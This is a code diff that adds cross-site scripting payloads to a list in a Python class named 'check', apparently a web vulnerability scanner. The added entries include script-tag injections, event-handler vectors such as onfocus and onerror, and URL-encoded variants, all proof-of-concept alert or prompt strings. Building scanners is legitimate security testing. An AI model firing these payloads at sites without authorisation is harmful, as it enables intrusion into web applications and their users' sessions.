@@ -12,6 +12,9 @@ class check:
                             "1<ScRiPt >prompt(962477)</sCripT>",
                             "<script>alert('xssya')</script>",
                             "1<ScRiPt>prompt(999691)</ScRiPt>",
+                            "\";alert('XSS)//",
+                            "<IMG \"""><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
+                            "<w contenteditable id=x onfocus=alert(1)>",
                             "//1<ScRiPt>prompt(919397)</ScRiPt>",
                             "'';!--\"<XSS>=&{()}",
                             "<scRiPt>alert(1);</scrIPt>",
@@ -51,6 +54,9 @@ class check:
                             "<marquee/onstart=confirm(2)>",
                             "<video><source onerror='javascript:alert(1)'>",
                             "<A HREF=\"http://www.google.com./\">XSS</A>",
-                            "<svg/onload=prompt(1);>",]
-
+                            "<svg/onload=prompt(1);>",
+                            "#%23><img src=M onerror=alert('XSS');>",
+                            "%22;alert%28%27XSS%29//",
+                            "<IMG %22%22%22><SCRIPT>alert(%22XSS%22)</SCRIPT>%22>",
+                            "<w contenteditable id=x onfocus=alert(1)>"]
 
